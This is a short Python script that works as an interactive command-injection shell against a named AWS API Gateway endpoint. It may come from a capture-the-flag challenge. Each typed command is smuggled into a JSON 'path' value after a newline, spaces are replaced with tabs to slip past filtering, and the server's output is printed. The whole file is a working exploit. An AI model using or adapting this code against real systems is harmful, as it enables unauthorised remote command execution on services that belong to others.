import json
import requests

url = "https://oo5apsmnc8.execute-api.eu-west-1.amazonaws.com/stag/wh01"

while True:
	base_cmd = "/root\\n"
	cmd = base_cmd + input("> ")
	print(cmd)
	cmd = cmd.replace(" ","\\t")
	path = f"{{\"path\": \"{cmd}\"}}"
	print("path: ", path)
	# path = path.format()
	r = requests.post(url, data = path)
	print(r.json()['body'])
